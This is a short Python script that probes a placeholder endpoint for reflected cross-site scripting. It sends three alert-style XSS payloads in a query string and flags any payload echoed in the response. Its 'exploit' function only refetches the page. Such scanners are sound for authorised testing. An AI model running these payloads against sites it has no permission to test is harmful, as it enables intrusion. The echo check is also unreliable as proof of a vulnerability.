import requests

payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<body onload=alert('XSS')>"]
url = "http://example.com/vulnerable_endpoint?query="

def check_xss(url, payloads):
    for payload in payloads:
        target_url = url + payload
        response = requests.get(target_url)
        if payload in response.text:
            print(f"Possible XSS vulnerability found with payload: {payload}")
            exploit_xss(target_url)
        else:
            print(f"Payload {payload} does not seem to cause an alert.")

def exploit_xss(url):
    print(f"Exploiting XSS vulnerability at {url}")
    response = requests.get(url)
    print("Response:")
    print(response.text)

check_xss(url, payloads)
